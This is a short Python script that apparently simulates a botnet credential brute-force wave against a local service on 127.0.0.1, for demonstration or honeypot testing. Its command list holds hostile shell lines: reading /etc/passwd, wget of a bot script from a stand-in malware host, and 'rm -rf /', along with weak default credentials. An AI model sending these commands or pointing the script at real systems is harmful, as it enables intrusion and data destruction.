import socket
import time
import random
import threading

TARGET_IP = '127.0.0.1'
TARGET_PORT = 9999

# Fake data to make the attack look real
FAKE_IPS = ['192.168.1.50', '10.0.0.5', '45.33.22.11', '203.0.113.5', '198.51.100.2']
USERNAMES = ['admin', 'root', 'user', 'support', 'service']
PASSWORDS = ['123456', 'password', 'admin123', 'toor', 'default']
COMMANDS = ['cat /etc/passwd', 'wget http://malware.com/bot.sh', 'rm -rf /', 'uname -a', 'whoami']

def bot_attack(bot_id):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        
        # Randomize delay so it looks natural on screen
        time.sleep(random.uniform(0.1, 0.5))
        
        # Receive Login Prompt
        s.recv(1024)
        
        # Send Username
        user = random.choice(USERNAMES)
        s.sendall(f"{user}\n".encode())
        
        # Receive Password Prompt
        s.recv(1024)
        
        # Send Password
        pwd = random.choice(PASSWORDS)
        s.sendall(f"{pwd}\n".encode())

        # Receive Shell Prompt
        s.recv(1024)

        # Send a few random commands
        for _ in range(random.randint(1, 3)):
            cmd = random.choice(COMMANDS)
            s.sendall(f"{cmd}\n".encode())
            s.recv(1024) # Wait for prompt
            time.sleep(0.2)

        s.close()
        print(f"[Bot #{bot_id}] Attack complete using {user}/{pwd}")
    except Exception as e:
        print(f"Connection failed: {e}")

def launch_massive_attack():
    print("--- LAUNCHING BOTNET SIMULATION ---")
    threads = []
    # Launch 20 fake bots
    for i in range(20):
        t = threading.Thread(target=bot_attack, args=(i,))
        threads.append(t)
        t.start()
        time.sleep(0.1) # Stagger them slightly

    for t in threads:
        t.join()
    print("--- ATTACK WAVE COMPLETE ---")

if __name__ == '__main__':
    launch_massive_attack()